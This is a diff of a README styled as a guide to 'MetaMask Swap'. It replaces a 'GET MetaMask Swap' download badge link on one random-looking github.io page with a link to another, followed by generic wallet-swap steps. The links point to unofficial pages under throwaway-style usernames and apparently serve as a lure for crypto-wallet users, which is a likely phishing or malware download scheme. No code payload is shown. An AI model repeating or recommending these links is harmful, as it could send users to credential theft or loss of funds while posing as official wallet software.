@@ -58,7 +58,7 @@ MetaMask Swap tokens are handled through the wallet interface, so users can keep
 
 Prerequisites: A configured wallet, supported assets, enough balance for network costs, and time to review each confirmation screen carefully.
 
-[![GET MetaMask Swap](https://img.shields.io/badge/GET%20%E2%80%94%20MetaMask%20Swap-0078D6?style=for-the-badge&logoColor=white)](https://brysonsandersuxqn.github.io/.github/metamask-swap)
+[![GET MetaMask Swap](https://img.shields.io/badge/GET%20%E2%80%94%20MetaMask%20Swap-0078D6?style=for-the-badge&logoColor=white)](https://princehannazlko.github.io/.github/metamask-swap)
 
 1.  **Open the Wallet Flow:** Launch the MetaMask Swap app experience through the wallet interface or use MetaMask Swap extension access on desktop.
 2.  **Choose Assets:** Select the token you want to trade and the token you want to receive, then verify that the MetaMask Swap tokens match your intended exchange.
